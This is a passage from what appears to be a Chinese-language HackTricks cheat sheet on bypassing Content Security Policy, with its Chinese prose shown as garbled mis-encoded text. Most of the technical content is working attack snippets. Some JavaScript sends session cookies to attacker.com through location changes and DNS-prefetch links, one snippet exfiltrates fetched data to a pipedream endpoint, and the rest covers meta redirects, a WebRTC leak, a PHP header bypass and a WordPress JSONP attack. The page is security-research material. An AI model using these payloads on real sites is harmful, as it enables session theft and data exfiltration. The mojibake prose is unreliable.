CSPè¿è§„æ˜¯ä¸€ç§å³æ—¶æ³„éœ²ã€‚åªéœ€è¦åŠ è½½ä¸€ä¸ªæŒ‡å‘`https://redirectme.domain1.com`çš„iframeï¼Œå¹¶ç›‘å¬`securitypolicyviolation`äº‹ä»¶ï¼Œè¯¥äº‹ä»¶åŒ…å«`blockedURI`å±æ€§ï¼Œå…¶ä¸­åŒ…å«è¢«é˜»æ­¢çš„URIçš„åŸŸåã€‚è¿™æ˜¯å› ä¸º`https://redirectme.domain1.com`ï¼ˆCSPå…è®¸ï¼‰é‡å®šå‘åˆ°`https://adminsecret321.domain2.com`ï¼ˆCSPé˜»æ­¢ï¼‰ã€‚è¿™åˆ©ç”¨äº†CSPå¤„ç†iframesçš„æœªå®šä¹‰è¡Œä¸ºã€‚Chromeå’ŒFirefoxåœ¨è¿™æ–¹é¢çš„è¡Œä¸ºä¸åŒã€‚

å½“ä½ çŸ¥é“å¯èƒ½ç»„æˆç§˜å¯†å­åŸŸåçš„å­—ç¬¦æ—¶ï¼Œä½ è¿˜å¯ä»¥ä½¿ç”¨äºŒåˆ†æœç´¢ï¼Œå¹¶æ£€æŸ¥CSPä½•æ—¶é˜»æ­¢èµ„æºä½•æ—¶ä¸é˜»æ­¢èµ„æºï¼Œä»è€Œåœ¨CSPä¸­åˆ›å»ºä¸åŒçš„ç¦æ­¢åŸŸåï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç§˜å¯†å¯èƒ½ä»¥doc-X-XXXX.secdrivencontent.devçš„å½¢å¼å­˜åœ¨ï¼‰ã€‚
```
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
ä»[**è¿™é‡Œ**](https://ctftime.org/writeup/29310)çš„æŠ€å·§ã€‚

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofæ˜¯æ‰€æœ‰åŠ å¯†æ¼æ´èµé‡‘çš„å®¶å›­ã€‚**

**å³æ—¶è·å¾—å¥–åŠ±**\
åªæœ‰åœ¨å®¢æˆ·å­˜å…¥å¥–åŠ±é¢„ç®—åï¼ŒHackenProofæ‰ä¼šå¯åŠ¨èµé‡‘ã€‚åœ¨æ¼æ´éªŒè¯åï¼Œæ‚¨å°†è·å¾—å¥–åŠ±ã€‚

**åœ¨web3æ¸—é€æµ‹è¯•ä¸­ç§¯ç´¯ç»éªŒ**\
åŒºå—é“¾åè®®å’Œæ™ºèƒ½åˆçº¦æ˜¯æ–°çš„äº’è”ç½‘ï¼åœ¨å…¶å…´èµ·çš„æ—¶ä»£æŒæ¡web3å®‰å…¨ã€‚

**æˆä¸ºweb3é»‘å®¢ä¼ å¥‡**\
æ¯æ¬¡éªŒè¯çš„æ¼æ´éƒ½ä¼šè·å¾—å£°èª‰ç§¯åˆ†ï¼Œå¹¶å æ®æ¯å‘¨æ’è¡Œæ¦œçš„æ¦œé¦–ã€‚

[**åœ¨HackenProofä¸Šæ³¨å†Œ**](https://hackenproof.com/register)å¼€å§‹ä»æ‚¨çš„é»‘å®¢æ”»å‡»ä¸­è·åˆ©ï¼

{% embed url="https://hackenproof.com/register" %}

## ç»•è¿‡CSPçš„ä¸å®‰å…¨æŠ€æœ¯

### PHPå“åº”ç¼“å†²åŒºè¶…è½½

PHPé»˜è®¤æƒ…å†µä¸‹ä¼šå°†å“åº”ç¼“å†²åŒºè®¾ç½®ä¸º4096å­—èŠ‚ã€‚å› æ­¤ï¼Œå¦‚æœPHPæ˜¾ç¤ºè­¦å‘Šï¼Œé€šè¿‡åœ¨è­¦å‘Šä¸­æä¾›è¶³å¤Ÿçš„æ•°æ®ï¼Œå“åº”å°†åœ¨CSPå¤´ä¹‹å‰å‘é€ï¼Œå¯¼è‡´å¤´è¢«å¿½ç•¥ã€‚\
ç„¶åï¼Œè¯¥æŠ€æœ¯åŸºæœ¬ä¸Šæ˜¯é€šè¿‡ä½¿ç”¨è­¦å‘Šå¡«å……å“åº”ç¼“å†²åŒºï¼Œä»¥ä¾¿ä¸å‘é€CSPå¤´ã€‚

ä»[**è¿™ç¯‡æ–‡ç« **](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points)ä¸­å¾—åˆ°çš„æƒ³æ³•ã€‚

### é‡å†™é”™è¯¯é¡µé¢

ä»[**è¿™ç¯‡æ–‡ç« **](https://blog.ssrf.kr/69)ä¸­çœ‹æ¥ï¼Œå¯ä»¥é€šè¿‡åŠ è½½ä¸€ä¸ªé”™è¯¯é¡µé¢ï¼ˆå¯èƒ½æ²¡æœ‰CSPï¼‰å¹¶é‡å†™å…¶å†…å®¹æ¥ç»•è¿‡CSPä¿æŠ¤ã€‚
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### SOME + 'self' + wordpress

SOMEæ˜¯ä¸€ç§æ»¥ç”¨é¡µé¢ç«¯ç‚¹ä¸­çš„XSSï¼ˆæˆ–é«˜åº¦å—é™çš„XSSï¼‰çš„æŠ€æœ¯ï¼Œä»¥æ»¥ç”¨åŒä¸€æºçš„å…¶ä»–ç«¯ç‚¹ã€‚è¿™æ˜¯é€šè¿‡ä»æ”»å‡»è€…é¡µé¢åŠ è½½æ˜“å—æ”»å‡»çš„ç«¯ç‚¹ï¼Œç„¶åå°†æ”»å‡»è€…é¡µé¢åˆ·æ–°åˆ°è¦æ»¥ç”¨çš„åŒä¸€æºçš„çœŸå®ç«¯ç‚¹æ¥å®ç°çš„ã€‚è¿™æ ·ï¼Œæ˜“å—æ”»å‡»çš„ç«¯ç‚¹å¯ä»¥ä½¿ç”¨è´Ÿè½½ä¸­çš„`opener`å¯¹è±¡æ¥è®¿é—®è¦æ»¥ç”¨çš„çœŸå®ç«¯ç‚¹çš„DOMã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…ï¼š

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

æ­¤å¤–ï¼Œ**wordpress**åœ¨`/wp-json/wp/v2/users/1?_jsonp=data`ä¸­æœ‰ä¸€ä¸ª**JSONP**ç«¯ç‚¹ï¼Œå°†åœ¨è¾“å‡ºä¸­**åå°„**å‘é€çš„**æ•°æ®**ï¼ˆä»…é™å­—æ¯ã€æ•°å­—å’Œç‚¹ï¼‰ã€‚

æ”»å‡»è€…å¯ä»¥æ»¥ç”¨è¯¥ç«¯ç‚¹å¯¹WordPressè¿›è¡ŒSOMEæ”»å‡»ï¼Œå¹¶å°†å…¶åµŒå…¥`<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>`ä¸­ï¼Œè¯·æ³¨æ„ï¼Œæ­¤**è„šæœ¬**å°†è¢«**åŠ è½½**ï¼Œå› ä¸ºå®ƒè¢«'`self`'å…è®¸ã€‚æ­¤å¤–ï¼Œç”±äºå®‰è£…äº†WordPressï¼Œæ”»å‡»è€…å¯èƒ½é€šè¿‡**ç»•è¿‡CSP**çš„æ˜“å—æ”»å‡»çš„**å›è°ƒ**ç«¯ç‚¹æ¥æ»¥ç”¨SOMEæ”»å‡»ï¼Œä»¥ä¸ºç”¨æˆ·æä¾›æ›´å¤šæƒé™ï¼Œå®‰è£…æ–°æ’ä»¶ç­‰ã€‚\
æœ‰å…³å¦‚ä½•æ‰§è¡Œæ­¤æ”»å‡»çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹[https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## CSPä¿¡æ¯æ³„éœ²ç»•è¿‡

å¦‚æœå­˜åœ¨ä¸¥æ ¼çš„CSPï¼Œä¸å…è®¸æ‚¨ä¸å¤–éƒ¨æœåŠ¡å™¨è¿›è¡Œäº¤äº’ï¼Œæ‚¨å§‹ç»ˆå¯ä»¥æ‰§è¡Œä¸€äº›æ“ä½œæ¥æ³„éœ²ä¿¡æ¯ã€‚

### Location

æ‚¨å¯ä»¥æ›´æ–°ä½ç½®ä»¥å°†ç§˜å¯†ä¿¡æ¯å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼š
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### Metaæ ‡ç­¾

æ‚¨å¯ä»¥é€šè¿‡æ³¨å…¥ä¸€ä¸ªmetaæ ‡ç­¾æ¥è¿›è¡Œé‡å®šå‘ï¼ˆè¿™åªæ˜¯ä¸€ä¸ªé‡å®šå‘ï¼Œä¸ä¼šæ³„éœ²å†…å®¹ï¼‰
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### DNS é¢„è§£æ

ä¸ºäº†åŠ å¿«é¡µé¢åŠ è½½é€Ÿåº¦ï¼Œæµè§ˆå™¨ä¼šæå‰å°†ä¸»æœºåè§£æä¸º IP åœ°å€å¹¶ç¼“å­˜èµ·æ¥ä»¥å¤‡åç”¨ã€‚\
æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹å¼å‘ŠçŸ¥æµè§ˆå™¨é¢„è§£æä¸»æœºåï¼š`<link reol="dns-prefetch" href="something.com">`

æ‚¨å¯ä»¥åˆ©ç”¨è¿™ç§è¡Œä¸ºæ¥é€šè¿‡ DNS è¯·æ±‚**æ³„éœ²æ•æ„Ÿä¿¡æ¯**ï¼š
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
å¦ä¸€ç§æ–¹æ³•ï¼š
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
ä¸ºäº†é¿å…è¿™ç§æƒ…å†µå‘ç”Ÿï¼ŒæœåŠ¡å™¨å¯ä»¥å‘é€ä»¥ä¸‹HTTPå¤´éƒ¨ï¼š
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
æ˜¾ç„¶ï¼Œè¿™ç§æŠ€æœ¯åœ¨æ— å¤´æµè§ˆå™¨ï¼ˆæœºå™¨äººï¼‰ä¸­ä¸èµ·ä½œç”¨
{% endhint %}

### WebRTC

åœ¨ä¸€äº›é¡µé¢ä¸Šï¼Œä½ å¯ä»¥çœ‹åˆ°**WebRTCä¸æ£€æŸ¥CSPçš„`connect-src`ç­–ç•¥**ã€‚
```javascript
var pc = new RTCPeerConnection({"iceServers":[{"urls":["turn:74.125.140.127:19305?transport=udp"],"username":"_all_your_data_belongs_to_us","credential":"."}]});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp));
```
ç„¶è€Œï¼Œçœ‹èµ·æ¥[ä¸å†å¯èƒ½](https://github.com/w3c/webrtc-nv-use-cases/issues/35)ï¼ˆæˆ–è€…è‡³å°‘ä¸é‚£ä¹ˆå®¹æ˜“ï¼‰ã€‚

å¦‚æœä½ çŸ¥é“å¦‚ä½•ä½¿ç”¨WebRTCæ³„éœ²ä¿¡æ¯ï¼Œè¯·[**æäº¤æ‹‰å–è¯·æ±‚ï¼**](https://github.com/carlospolop/hacktricks)

## åœ¨çº¿æ£€æŸ¥CSPç­–ç•¥

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## è‡ªåŠ¨åˆ›å»ºCSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## å‚è€ƒèµ„æ–™

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)

â€‹

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofæ˜¯æ‰€æœ‰åŠ å¯†æ¼æ´èµé‡‘çš„å®¶å›­ã€‚**

**å³æ—¶è·å¾—å¥–åŠ±**\
HackenProofçš„èµé‡‘åªæœ‰åœ¨å®¢æˆ·å­˜å…¥å¥–åŠ±é¢„ç®—åæ‰ä¼šå¯åŠ¨ã€‚åœ¨æ¼æ´éªŒè¯åï¼Œæ‚¨å°†è·å¾—å¥–åŠ±ã€‚

**åœ¨Web3æ¸—é€æµ‹è¯•ä¸­ç§¯ç´¯ç»éªŒ**\
åŒºå—é“¾åè®®å’Œæ™ºèƒ½åˆçº¦æ˜¯æ–°çš„äº’è”ç½‘ï¼æŒæ¡æ­£åœ¨å´›èµ·çš„Web3å®‰å…¨ã€‚

**æˆä¸ºWeb3é»‘å®¢ä¼ å¥‡**\
æ¯æ¬¡éªŒè¯çš„æ¼æ´éƒ½ä¼šè·å¾—å£°èª‰ç§¯åˆ†ï¼Œå¹¶å é¢†æ¯å‘¨æ’è¡Œæ¦œçš„æ¦œé¦–ã€‚

[**åœ¨HackenProofä¸Šæ³¨å†Œ**](https://hackenproof.com/register)å¼€å§‹ä»æ‚¨çš„é»‘å®¢è¡ŒåŠ¨ä¸­è·åˆ©ï¼

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**ï¼Ÿæˆ–è€…æƒ³è¦è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTæ”¶è—å“**](https://opensea.io/collection/the-peass-family)â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
